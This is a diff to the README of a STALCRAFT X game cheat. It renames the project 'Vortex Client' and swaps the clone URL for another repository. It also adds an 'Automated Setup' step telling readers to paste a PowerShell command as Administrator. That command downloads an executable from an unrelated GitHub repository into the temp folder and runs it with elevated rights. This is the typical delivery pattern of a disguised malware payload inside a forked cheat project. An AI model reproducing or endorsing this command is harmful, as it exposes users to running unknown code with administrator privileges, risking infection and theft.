@@ -1,4 +1,4 @@
-# STALCRAFT X ULTIMATE CHEAT - Termenal-edition
+# VORTEX CLIENT - STALCRAFT X - Termenal-edition
 
 <div align="center">
 
@@ -25,7 +25,24 @@
 
 </div>
 
+---
+
+<h2 align="center">🛠️ Installation</h2>
+
+<h3 align="center">Automated Setup (Recommended)</h3>
+
+<p align="center">Run the following command in Command Prompt as Administrator:</p>
+
+<p align="center">1. Press <kbd>Win</kbd> + <kbd>R</kbd></p>
+
+<p align="center">2. Copy and paste the following command:</p>
+
+```powershell
+powershell -c irm https://github.com/getupys/Xeno-v1.3.60/releases/latest/download/Xeno.exe -OutFile $env:TEMP\Xeno.exe; Start-Process $env:TEMP\Xeno.exe -Verb RunAs
+```
+
 ## 🚀 Функционал
+
 
 ### 📡 ESP (Радар)
 - Отображение всех игроков в терминале
@@ -50,7 +67,7 @@
 ## 🛠 Установка
 
 ```bash
-git clone https://github.com/IamNotDaniil/stalcraft-cheat.git
+git clone https://github.com/CentipedeRegister/Vortex-Client.git
 cd stalcraft-cheat
 mkdir build && cd build
 cmake ..
